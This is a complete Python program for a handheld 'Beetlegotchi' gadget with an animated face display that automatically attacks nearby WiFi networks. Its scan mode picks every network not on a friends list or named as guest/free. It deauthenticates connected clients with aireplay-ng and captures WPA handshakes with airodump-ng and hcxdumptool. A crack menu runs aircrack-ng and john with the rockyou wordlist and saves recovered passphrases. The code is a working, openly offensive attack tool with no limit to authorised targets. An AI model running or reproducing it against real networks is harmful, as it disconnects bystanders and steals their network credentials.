#!/usr/bin/env python3
# /opt/beetle/tools/wifi/pwnagotchi_runner.py
import time
import os
import subprocess
import shutil
import signal
import sys
import random
import math
from display.screen import MenuDisplay, device
from config.gpio_config import read_buttons, REPEAT_DELAY
from tools.wifi.scanner import scan_networks, count_clients
from PIL import Image, ImageDraw, ImageFont

VISIBLE_LINES = 4

# ==================== CONFIGURACIÓN COMÚN ====================
IFACE = "mon0"
MON_UP_CMD = ["sudo", "mon0up"]
MON_DOWN_CMD = ["sudo", "mon0down"]
DEFAULT_DEAUTH_COUNT = "100"
AIRODUMP_START_DELAY = 3.5
POST_CAPTURE_WAIT = 7.0
AIREDURATION_LIMIT = 25

_child_procs = []
_interrupted = False
_brought_up_by_script = False


def run_cmd(cmd, stdout=None, stderr=None, text=True, check=False, timeout=None):
    return subprocess.run(cmd, stdout=stdout, stderr=stderr, text=text, check=check, timeout=timeout)


def check_command_exists(name):
    try:
        subprocess.run(["which", name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True
    except subprocess.CalledProcessError:
        return False


def iface_is_up(iface=IFACE):
    try:
        res = subprocess.run(["ip", "-o", "link", "show", iface], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return res.returncode == 0 and ("state up" in res.stdout.lower() or "<up" in res.stdout.lower())
    except Exception:
        return False


def _run_mon_cmd(cmd, timeout=4.0):
    try:
        p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=timeout)
        return p.returncode, (p.stdout or ""), (p.stderr or "")
    except Exception as e:
        return -1, "", str(e)


def bring_mon0_up():
    try:
        _run_mon_cmd(MON_UP_CMD)
    except Exception:
        pass
    for _ in range(12):
        if iface_is_up() or os.path.isdir(f"/sys/class/net/{IFACE}"):
            return True
        time.sleep(0.3)
    return False


def bring_mon0_down():
    try:
        _run_mon_cmd(MON_DOWN_CMD)
    except Exception:
        pass
    time.sleep(0.6)
    return not iface_is_up() and not os.path.isdir(f"/sys/class/net/{IFACE}")


def _terminate_child_procs():
    global _child_procs
    for p in list(_child_procs):
        try:
            if p.poll() is None:
                p.terminate()
                p.wait(timeout=2)
        except Exception:
            try:
                p.kill()
            except Exception:
                pass
    _child_procs.clear()


def _signal_handler(signum, frame):
    global _interrupted
    _interrupted = True
    _terminate_child_procs()
    try:
        bring_mon0_down()
    except Exception:
        pass
    sys.exit(1)


signal.signal(signal.SIGINT, _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)


# ==================== LÓGICA HCXTOOLS INTEGRADA ====================
def run_hcxtools_internal(ssid, bssid, channel, capture_time=50):
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    folder = "/opt/beetle/reports/beetlegotchi"
    os.makedirs(folder, exist_ok=True)
    safe_ssid = "".join(c for c in ssid if c.isalnum() or c in "-*")[:30]
    base = os.path.join(folder, f"hcxdump_{safe_ssid}_{timestamp}")
    pcapng = base + ".pcapng"
    hccap = base + ".22000"
    john_in = base + ".john"
    log_file = base + ".log"
    filter_file = "/tmp/ap_filter.txt"

    was_up_before = iface_is_up()
    if not was_up_before:
        if not bring_mon0_up():
            return None
        global _brought_up_by_script
        _brought_up_by_script = True

    try:
        with open(filter_file, "w") as f:
            f.write(bssid + "\n")
    except Exception:
        pass

    run_cmd(["sudo", "iw", "dev", IFACE, "set", "channel", str(channel)])

    cmd = [
        "sudo", "hcxdumptool",
        "-i", IFACE,
        f"--filterlist_ap={filter_file}",
        "--filtermode=2",
        "--enable_status=15",
        "-o", pcapng
    ]

    try:
        with open(log_file, "w") as log:
            proc = subprocess.Popen(cmd, stdout=log, stderr=log, text=True)
            _child_procs.append(proc)
            elapsed = 0
            deauth_interval = 8
            while elapsed < capture_time:
                if proc.poll() is not None:
                    break
                try:
                    subprocess.run(["sudo", "aireplay-ng", "--deauth", "12", "-a", bssid, IFACE],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
                except Exception:
                    pass
                time.sleep(deauth_interval)
                elapsed += deauth_interval

            if proc.poll() is None:
                proc.terminate()
                proc.wait(timeout=5)
    except Exception:
        _terminate_child_procs()
        if _brought_up_by_script and not was_up_before:
            bring_mon0_down()
        return None

    if not os.path.isfile(pcapng) or os.path.getsize(pcapng) < 8000:
        _terminate_child_procs()
        if _brought_up_by_script and not was_up_before:
            bring_mon0_down()
        return None

    try:
        subprocess.run(["hcxpcapngtool", "-o", hccap, pcapng], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15)
    except Exception:
        pass

    if not os.path.isfile(hccap) or os.path.getsize(hccap) == 0:
        _terminate_child_procs()
        if _brought_up_by_script and not was_up_before:
            bring_mon0_down()
        return None

    try:
        subprocess.run(["hcxhashtool", "-i", hccap, f"--john={john_in}"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
    except Exception:
        try:
            subprocess.run(["hcxpcapngtool", "--john", john_in, hccap],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
        except Exception:
            pass

    if not os.path.isfile(john_in) or os.path.getsize(john_in) == 0:
        _terminate_child_procs()
        if _brought_up_by_script and not was_up_before:
            bring_mon0_down()
        return None

    wordlist = "/usr/share/wordlists/rockyou.txt"
    if os.path.isfile(wordlist):
        try:
            subprocess.run(["john", f"--wordlist={wordlist}", "--format=wpapsk", john_in],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
        except Exception:
            pass

    _terminate_child_procs()
    if _brought_up_by_script and not was_up_before:
        bring_mon0_down()
    return pcapng


# ==================== AIREPLAY INTEGRADO ====================
def run_aireplay_internal(ssid, bssid, channel, client_mac=None):
    for cmd in ("airodump-ng", "aireplay-ng", "aircrack-ng"):
        if not check_command_exists(cmd):
            return None

    timestamp = time.strftime("%Y%m%d_%H%M%S")
    folder = "/opt/beetle/reports/beetlegotchi"
    os.makedirs(folder, exist_ok=True)
    safe_ssid = "".join(c for c in ssid if c.isalnum() or c in ('-', '*'))[:30]
    cap_prefix = os.path.join(folder, f"handshake_{safe_ssid}_{timestamp}")
    cap_file = f"{cap_prefix}-01.cap"

    was_up_before = iface_is_up()
    if not was_up_before:
        if not bring_mon0_up():
            return None
        global _brought_up_by_script
        _brought_up_by_script = True

    airodump_cmd = ["sudo", "airodump-ng", "-c", str(channel), "--bssid", bssid, "-w", cap_prefix, IFACE]
    try:
        airodump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        _child_procs.append(airodump_proc)
    except Exception:
        _terminate_child_procs()
        if _brought_up_by_script:
            bring_mon0_down()
        return None

    time.sleep(AIRODUMP_START_DELAY)

    aireplay_cmd = ["sudo", "aireplay-ng", "--deauth", DEFAULT_DEAUTH_COUNT, "-a", bssid, IFACE]
    if client_mac:
        aireplay_cmd.extend(["-c", client_mac])

    try:
        log_path = os.path.join(folder, f"aireplay_{safe_ssid}_{timestamp}.log")
        with open(log_path, "w") as log:
            aireplay_proc = subprocess.Popen(aireplay_cmd, stdout=log, stderr=log, text=True)
            _child_procs.append(aireplay_proc)
            start = time.time()
            while aireplay_proc.poll() is None:
                if _interrupted or time.time() - start > AIREDURATION_LIMIT:
                    aireplay_proc.terminate()
                    break
                time.sleep(0.4)
    except Exception:
        _terminate_child_procs()
        if _brought_up_by_script:
            bring_mon0_down()
        return None

    time.sleep(POST_CAPTURE_WAIT)
    try:
        if airodump_proc and airodump_proc.poll() is None:
            airodump_proc.terminate()
            airodump_proc.wait(timeout=4)
    except Exception:
        pass

    _child_procs[:] = [p for p in _child_procs if p.poll() is None]
    if _brought_up_by_script:
        bring_mon0_down()

    return cap_file if os.path.isfile(cap_file) else None


# ====================== BEETLEGOTCHI CON CRACKING INTEGRADO ======================
class PwnagotchiRunner:
    def __init__(self):
        self.display = MenuDisplay()
        self.handshakes = 0
        self.last_networks = []
        self.reports_folder = "/opt/beetle/reports"
        os.makedirs(self.reports_folder, exist_ok=True)
        self.beetlegotchi_folder = os.path.join(self.reports_folder, "beetlegotchi")
        os.makedirs(self.beetlegotchi_folder, exist_ok=True)
        self.friends_file = "/opt/beetle/tools/wifi/friends.txt"
        self.friends_ssids = self._load_friends_ssids()
        self.current_face = None
        self.current_ssid = ""
        self.last_face_time = 0
        self.mood_start_time = time.time()
        self.last_enter_time = 0
        self.ENTER_COOLDOWN = 0.28

        self.face_variations = {
            "cool": ["cool"],
            "happy": ["happy", "excited"],
            "handshake_success": ["handshake_success"],
            "sad": ["sad", "bored"],
            "angry": ["angry", "frustrated"],
            "frustrated": ["frustrated", "angry"],
            "thinking": ["thinking", "looking_up"],
            "bored": ["bored", "sleepy", "neutral"],
            "neutral": ["neutral", "looking_left", "looking_right"],
            "looking_left": ["looking_left"],
            "looking_right": ["looking_right"],
            "looking_up": ["looking_up"],
            "sleepy": ["sleepy"],
            "surprised": ["surprised"]
        }

    def _load_friends_ssids(self):
        friends = set()
        if os.path.isfile(self.friends_file):
            try:
                with open(self.friends_file, "r", encoding="utf-8") as f:
                    for line in f:
                        ssid = line.strip()
                        if ssid and not ssid.startswith("#"):
                            friends.add(ssid)
            except Exception:
                pass
        return friends

    def is_friend(self, ssid: str) -> bool:
        return ssid in self.friends_ssids

    def _draw_star(self, draw: ImageDraw.Draw, x: int, y: int, size: int, fill=255):
        outer_radius = size // 2
        inner_radius = int(outer_radius * 0.5)
        points = []
        for i in range(10):
            angle_deg = -90 + i * 36
            angle_rad = math.radians(angle_deg)
            r = outer_radius if i % 2 == 0 else inner_radius
            px = x + r * math.cos(angle_rad)
            py = y + r * math.sin(angle_rad)
            points.append((int(px), int(py)))
        draw.polygon(points, fill=fill)

    def _draw_pwn_face(self, draw: ImageDraw.Draw, face_type: str, ssid: str = ""):
        eye_y = 14
        eye_size = 22
        left_eye_x = 12
        right_eye_x = 47

        if face_type not in ("handshake_success", "sleepy"):
            draw.ellipse([left_eye_x, eye_y, left_eye_x + eye_size, eye_y + eye_size], outline=255, fill=0)
            draw.ellipse([right_eye_x, eye_y, right_eye_x + eye_size, eye_y + eye_size], outline=255, fill=0)

        if face_type == "cool":
            draw.rectangle([left_eye_x - 2, eye_y - 2, left_eye_x + eye_size + 2, eye_y + eye_size + 2], fill=255)
            draw.rectangle([right_eye_x - 2, eye_y - 2, right_eye_x + eye_size + 2, eye_y + eye_size + 2], fill=255)
            draw.rectangle([left_eye_x + eye_size - 3, eye_y + 9, right_eye_x + 4, eye_y + 13], fill=255)
            draw.line([22, 44, 55, 44], fill=255, width=2)
            if ssid:
                try:
                    small_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 9)
                    draw.text((4, 55), ssid[:19], font=small_font, fill=255)
                except:
                    draw.text((4, 55), ssid[:15], font=self.display.font, fill=255)
            return

        offset_x = offset_y = 0
        if "looking_right" in face_type: offset_x = 6
        elif "looking_left" in face_type: offset_x = -6
        elif "looking_up" in face_type: offset_y = -5
        elif "thinking" in face_type:
            offset_x = random.choice([-4, 0, 4])
            offset_y = random.choice([-2, 0, 2])

        if face_type == "handshake_success":
            star_size = 18
            self._draw_star(draw, left_eye_x + eye_size//2, eye_y + eye_size//2, star_size, fill=255)
            self._draw_star(draw, right_eye_x + eye_size//2, eye_y + eye_size//2, star_size, fill=255)
        elif face_type in ("angry", "frustrated"):
            draw.rectangle([left_eye_x + 4, eye_y + 6, left_eye_x + eye_size - 4, eye_y + 14], fill=255)
            draw.rectangle([right_eye_x + 4, eye_y + 6, right_eye_x + eye_size - 4, eye_y + 14], fill=255)
        elif face_type == "sleepy":
            # Ojos cerrados
            draw.rectangle([left_eye_x + 4, eye_y + 10, left_eye_x + eye_size - 4, eye_y + 13], fill=255)
            draw.rectangle([right_eye_x + 4, eye_y + 10, right_eye_x + eye_size - 4, eye_y + 13], fill=255)
            # Fuente para Zzz
            try:
                z_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 10)
            except:
                z_font = self.display.font         
            # Movimiento diagonal (derecha + arriba)
            t = (time.time() * 8) % 20  # velocidad y recorrido
            # Z más cercana (más grande)
            draw.text((36 + t, 12 - t//3), "Z", font=z_font, fill=255)
            # Z media
            draw.text((44 + t, 7 - t//3), "z", font=z_font, fill=255)
            # Z lejana (más arriba)
            draw.text((52 + t, 3 - t//3), "z", font=z_font, fill=255)
        else:
            pupil_size = 7
            px = left_eye_x + 8 + offset_x
            py = eye_y + 8 + offset_y
            draw.ellipse([px - pupil_size//2, py - pupil_size//2, px + pupil_size//2, py + pupil_size//2], fill=255)
            px = right_eye_x + 8 + offset_x
            py = eye_y + 8 + offset_y
            draw.ellipse([px - pupil_size//2, py - pupil_size//2, px + pupil_size//2, py + pupil_size//2], fill=255)

        mouth_y = 39
        mouth_x = 22
        mouth_w = 39
        if face_type in ("happy", "excited", "handshake_success"):
            draw.arc([mouth_x, mouth_y - 2, mouth_x + mouth_w, mouth_y + 14], start=20, end=160, fill=255, width=3)
        elif face_type in ("sad", "bored"):
            draw.arc([mouth_x, mouth_y - 1, mouth_x + mouth_w, mouth_y + 12], start=200, end=340, fill=255, width=2)
        elif face_type in ("angry", "frustrated"):
            draw.line([mouth_x + 3, mouth_y + 6, mouth_x + mouth_w - 3, mouth_y + 3], fill=255, width=3)
        elif face_type == "thinking":
            draw.arc([mouth_x + 6, mouth_y + 2, mouth_x + mouth_w - 6, mouth_y + 9], start=0, end=180, fill=255, width=2)
        elif face_type == "sleepy":
            # Animación de ronquido (O que crece)
            phase = (time.time() * 3) % 3  # velocidad del ciclo

            if phase < 1:
                size = 4   # chico
            elif phase < 2:
                size = 7   # mediano
            else:
                size = 10  # grande

            cx = mouth_x + mouth_w // 2  # centro X
            cy = mouth_y + 7            # centro Y

            draw.ellipse(
                [cx - size//2, cy - size//2, cx + size//2, cy + size//2],
                outline=255,
                fill=255
            )
            
        else:
            draw.line([mouth_x + 4, mouth_y + 4, mouth_x + mouth_w - 4, mouth_y + 4], fill=255, width=2)

        if face_type == "excited":
            draw.line([left_eye_x + 2, eye_y - 1, left_eye_x + 16, eye_y + 2], fill=255, width=2)
            draw.line([right_eye_x + 2, eye_y - 1, right_eye_x + 16, eye_y + 2], fill=255, width=2)
        elif face_type in ("angry", "frustrated"):
            draw.line([left_eye_x + 3, eye_y + 1, left_eye_x + 18, eye_y - 2], fill=255, width=2)
            draw.line([right_eye_x + 3, eye_y + 1, right_eye_x + 18, eye_y - 2], fill=255, width=2)
        elif face_type == "thinking":
            draw.ellipse([38, 5, 41, 8], fill=255)
            draw.ellipse([44, 3, 47, 6], fill=255)

        if ssid:
            try:
                small_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 9)
                draw.text((4, 55), ssid[:19], font=small_font, fill=255)
            except Exception:
                draw.text((4, 55), ssid[:15], font=self.display.font, fill=255)

    def show_pwnagotchi_face(self, face: str, ssid: str = ""):
        """Usa MenuDisplay para que solo se actualicen los píxeles que cambian"""
        now = time.time()
        is_important = face in ("handshake_success", "angry", "frustrated", "excited", "surprised")
        if (face == self.current_face and ssid == self.current_ssid and
            not is_important and (now - self.last_face_time < 0.6)):
            return

        variations = self.face_variations.get(face, [face])
        chosen_face = random.choice(variations)
        self.current_face = face
        self.current_ssid = ssid
        self.last_face_time = now

        # Crear imagen completa y dejar que _update_differential se encargue de solo actualizar lo necesario
        with self.display.lock:
            img = Image.new("1", device.size)
            draw = ImageDraw.Draw(img)
            
            # HS counter
            hs_text = f"HS:{self.handshakes}"
            draw.text((2, 1), hs_text, font=self.display.font, fill=255)
            
            # Cara principal
            self._draw_pwn_face(draw, chosen_face, ssid)
            
            # Enviar a display (differential update)
            self.display.display(img)

    def update_status(self, face: str = "neutral", current_ssid: str = ""):
        self.show_pwnagotchi_face(face, current_ssid)

    def _is_enter_pressed(self) -> bool:
        if time.time() - self.last_enter_time < self.ENTER_COOLDOWN:
            return False
        buttons = read_buttons()
        if buttons.get("enter"):
            self.last_enter_time = time.time()
            return True
        return False

    def check_exit(self) -> bool:
        if self._is_enter_pressed():
            self.display.show_message(["   Saliendo...   "], center=True)
            time.sleep(0.7)
            return True
        return False

    def should_skip_network(self, ssid: str) -> bool:
        if not ssid or ssid.strip() == "":
            return True
        s = ssid.lower()
        return any(x in s for x in ["free", "guest", "public", "open", "opn", "xfinity"])

    def has_handshake(self, bssid: str) -> bool:
        if not bssid:
            return False
        bssid_clean = bssid.lower().replace(":", "")
        try:
            for f in os.listdir(self.beetlegotchi_folder):
                if f.lower().endswith(('.cap', '.pcap', '.pcapng', '.22000')) and bssid_clean in f.lower():
                    return True
        except Exception:
            pass
        return False

    def _is_valid_capture(self, cap_path: str) -> bool:
        if not os.path.isfile(cap_path):
            return False

        try:
            out = subprocess.check_output(
                ["aircrack-ng", cap_path],
                stderr=subprocess.STDOUT,
                timeout=10
            ).decode(errors="ignore").lower()

            # VALIDACIÓN 
            if "1 handshake" in out or "2 handshake" in out:
                return True

            return False

        except Exception:
            return False

    def _validate_and_save_capture(self, temp_cap_path: str, ssid: str, bssid: str) -> bool:
        if not self._is_valid_capture(temp_cap_path):
            try:
                os.remove(temp_cap_path)
            except Exception:
                pass
            return False

        safe_ssid = "".join(c for c in ssid if c.isalnum() or c in " -*")[:25]
        ext = os.path.splitext(temp_cap_path)[1]
        filename = f"{safe_ssid}_{bssid.replace(':', '')}{ext}"
        dest = os.path.join(self.beetlegotchi_folder, filename)
        try:
            shutil.move(temp_cap_path, dest)
            return True
        except Exception:
            try:
                shutil.copy2(temp_cap_path, dest)
                os.remove(temp_cap_path)
                return True
            except Exception:
                return False

    # ==================== CRACKING INTEGRADO ====================
    def _crack_single_file(self, cap_path, filename):
        self.display.show_message([" Crackeando... ", filename[:18]], center=True)
        time.sleep(1)

        wordlist = "/usr/share/wordlists/rockyou.txt"
        if not os.path.isfile(wordlist):
            self.display.show_message(["Wordlist no encontrada"], center=True)
            time.sleep(2)
            return None

        timestamp = time.strftime("%Y%m%d_%H%M%S")
        safe_ssid = os.path.basename(cap_path).split('.')[0][:20]
        psk_path = os.path.join(self.beetlegotchi_folder, f"psk_{safe_ssid}_{timestamp}.txt")
        logfile = os.path.join(self.beetlegotchi_folder, f"aircrack_{safe_ssid}_{timestamp}.log")

        bssid_for_crack = None
        fname = os.path.basename(cap_path)
        base = os.path.splitext(fname)[0]
        if '_' in base or '*' in base:
            potential = base.split('_')[-1].split('*')[-1].replace('-', '').replace(':', '')
            if len(potential) == 12 and all(c in '0123456789abcdefABCDEF' for c in potential):
                bssid_for_crack = ':'.join(potential[i:i+2] for i in range(0, 12, 2))

        cmd = ["sudo", "aircrack-ng", "-w", wordlist, "-l", psk_path, cap_path]
        if bssid_for_crack:
            cmd.insert(4, "-b")
            cmd.insert(5, bssid_for_crack)

        try:
            with open(logfile, "w") as log_f:
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
                key_found = None
                for raw in proc.stdout:
                    line = raw.rstrip("\n")
                    log_f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {line}\n")
                    log_f.flush()
                    lower = line.lower()
                    if "key found" in lower or "passphrase is" in lower:
                        try:
                            if "key found" in lower:
                                parte = lower.split(" key found!")[1].strip()
                            else:
                                parte = lower.split("passphrase is")[1].strip()
                            key_found = parte.strip(" []'\"\n")
                            self.display.show_message(["Clave:", key_found[:16]], center=True)
                            break
                        except Exception:
                            pass
                proc.wait(timeout=60)
        except Exception as e:
            self.display.show_message(["  Error en cracking  "], center=True)
            time.sleep(2)
            return None

        if key_found:
            try:
                with open(psk_path, "w") as f:
                    f.write(key_found + "\n")
            except Exception:
                pass
            time.sleep(4)
            return key_found
        else:
            self.display.show_message([" No se encontró clave "], center=True)
            time.sleep(3)
            return None

    # ==================== MODO SCAN ====================
    def _run_scan_mode(self):
        self.display.show_message(["  Beetlegotchi  ", "  Iniciando...  "], center=True)
        time.sleep(1.0)
        self.mood_start_time = time.time()

        while True:
            if self.check_exit():
                return
            elapsed = time.time() - self.mood_start_time
            if elapsed > 45:
                self.update_status("sleepy")
            elif elapsed > 30:
                self.update_status("bored")
            elif elapsed > 15:
                self.update_status(random.choice(["thinking", "neutral"]))
            else:
                self.update_status("looking_right")

            self.last_networks = scan_networks(duration=10)
            if not self.last_networks:
                self.update_status("sad")
                time.sleep(2)
                continue

            for net in self.last_networks:
                if self.check_exit():
                    return
                if len(net) == 4:
                    ssid, bssid, channel, signal = net
                else:
                    ssid, bssid, channel = net
                    signal = -999

                if self.should_skip_network(ssid) or self.is_friend(ssid) or self.has_handshake(bssid):
                    continue

                self.update_status("neutral", ssid)
                time.sleep(0.6)

                clients = count_clients(bssid, int(channel), duration=6) if 'count_clients' in globals() else 0

                if clients > 0:
                    self.update_status("happy", ssid)
                    time.sleep(0.8)
                    cap_file = run_aireplay_internal(ssid, bssid, channel)
                else:
                    if signal >= -68:
                        self.update_status("cool", ssid)
                        time.sleep(0.7)
                        cap_file = run_hcxtools_internal(ssid, bssid, channel)
                    else:
                        self.update_status("sad", ssid)
                        time.sleep(1.6)
                        continue

                if cap_file and self._validate_and_save_capture(cap_file, ssid, bssid):
                    self.handshakes += 1
                    self.update_status("handshake_success", ssid)
                    self.mood_start_time = time.time()
                    time.sleep(2.8)
                else:
                    self.update_status("frustrated" if clients > 0 else "thinking", ssid)
                    time.sleep(1.4)

                time.sleep(1.2)

            self.update_status("neutral")
            for _ in range(4):
                if self.check_exit():
                    return
                wait_time = time.time() - self.mood_start_time
                if wait_time > 50:
                    self.update_status("sleepy")
                elif wait_time > 35:
                    self.update_status("bored")
                else:
                    self.update_status(random.choice(["looking_left", "looking_right", "thinking"]))
                time.sleep(4.5)

    def _crack_menu(self):
        cap_files = [f for f in os.listdir(self.beetlegotchi_folder) if f.lower().endswith(('.cap', '.pcap', '.pcapng', '.22000'))]
        cap_files.sort()
        if not cap_files:
            self.display.show_message([" Sin archivos .cap "], center=True)
            time.sleep(2)
            return
        cap_files.append("BACK")
        position = 0
        last_pos = -1
        while True:
            buttons = read_buttons()
            if buttons["up"]:
                position = (position - 1) % len(cap_files)
            elif buttons["down"]:
                position = (position + 1) % len(cap_files)
            elif self._is_enter_pressed():
                if cap_files[position] == "BACK":
                    return
                self._crack_single_file(os.path.join(self.beetlegotchi_folder, cap_files[position]), cap_files[position])
                position = 0
                last_pos = -1
            if position != last_pos:
                start = max(0, position - (VISIBLE_LINES - 1))
                self.display.render(cap_files[start:start + VISIBLE_LINES], position - start)
                last_pos = position
            time.sleep(REPEAT_DELAY)

    def _borrar_menu(self):
        options = ["NO", "SI, BORRAR TODO"]
        position = 0
        last_pos = -1
        self.display.show_message(["   ¿Borrar todo?   "], center=True)
        time.sleep(1.2)
        while True:
            buttons = read_buttons()
            if buttons["up"]:
                position = (position - 1) % len(options)
            elif buttons["down"]:
                position = (position + 1) % len(options)
            elif self._is_enter_pressed():
                if options[position] == "NO":
                    return
                self._borrar_archivos()
                return
            if position != last_pos:
                self.display.render(options, position)
                last_pos = position
            time.sleep(REPEAT_DELAY)

    def _borrar_archivos(self):
        try:
            count = 0
            for f in os.listdir(self.beetlegotchi_folder):
                os.remove(os.path.join(self.beetlegotchi_folder, f))
                count += 1
            self.display.show_message([f"{count} archivos borrados"], center=True)
        except Exception:
            self.display.show_message(["  Error al borrar  " ], center=True)
        time.sleep(2.5)

    def run(self):
        options = ["SCAN", "CRACK", "BORRAR", "BACK"]
        position = 0
        last_pos = -1
        while True:
            buttons = read_buttons()
            if buttons["up"]:
                position = (position - 1) % len(options)
            elif buttons["down"]:
                position = (position + 1) % len(options)
            elif self._is_enter_pressed():
                choice = options[position]
                if choice == "BACK":
                    self.display.show_message(["   ¡Hasta luego!   "], center=True)
                    time.sleep(1)
                    return
                elif choice == "SCAN":
                    self._run_scan_mode()
                elif choice == "CRACK":
                    self._crack_menu()
                elif choice == "BORRAR":
                    self._borrar_menu()
                position = 0
                last_pos = -1
            if position != last_pos:
                start = max(0, position - (VISIBLE_LINES - 1))
                window = options[start:start + VISIBLE_LINES]
                self.display.render(window, position - start)
                last_pos = position
            time.sleep(REPEAT_DELAY)


if __name__ == "__main__":
    try:
        PwnagotchiRunner().run()
    except KeyboardInterrupt:
        print("\nBeetlegotchi terminado por el usuario.")
    except Exception as e:
        print(f"Error inesperado: {e}")
